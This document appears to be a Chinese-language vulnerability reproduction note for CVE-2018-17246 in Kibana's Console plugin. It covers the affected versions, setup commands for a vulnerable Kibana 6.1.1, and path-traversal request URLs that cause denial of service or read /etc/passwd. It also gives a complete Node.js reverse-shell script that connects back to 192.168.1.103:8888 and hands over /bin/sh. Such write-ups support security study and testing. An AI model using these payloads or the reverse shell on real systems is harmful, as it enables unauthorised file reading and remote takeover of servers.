# Elasticsearch Kibana Console插件命令执行漏洞(CVE-2018-17246)

影响版本:  
ElasticSearch Kibana <6.4.3, ElasticSearch Kibana <5.6.13  
## 相关链接：
https://www.anquanke.com/post/id/168291  
http://www.cnvd.org.cn/flaw/show/CNVD-2018-23907   
## 测试:
下载压缩包  
`wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.1.1.zip`  
`wget https://artifacts.elastic.co/downloads/kibana/kibana-6.1.1-linux-x86_64.tar.gz`  
解压运行  
`./elasticsearch-6.1.1/bin/elasticsearch`  
`./kibana-6.1.1-linux-x86_64/bin/kibana -H 0.0.0.0`  
漏洞场景  
- 拒绝服务攻击向量(root权限运行可触发)  
`/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis= ../../../cli_plugin/index`  
`/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../cli_plugin/cli.js`  
`/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../docs/cli.js`  
- 任意文件读取(服务端会抛出读取的内容,不需要root权限运行可触发)  
`/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd`   
- 配合第三方应用反弹shell(不需要root权限运行可触发)  
`/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../..//home/shell.js`  
shell.js(服务器需安装有nodejs)  
```
(function(){
	var net = require("net"),
		cp = require("child_process"),
		sh = cp.spawn("/bin/sh", []);
	var client = new net.Socket();
	client.connect(8888, "192.168.1.103", function(){
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
	});
	return /a/; //
})();
```
![DOS](https://github.com/LizhangHuang/vuls/raw/master/kibana/CVE-2018-17246/DOS.png)  
![文件读取](https://github.com/LizhangHuang/vuls/raw/master/kibana/CVE-2018-17246/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.png)  
![反弹shell](https://github.com/LizhangHuang/vuls/raw/master/kibana/CVE-2018-17246/%E5%8F%8D%E5%BC%B9shell.png)  
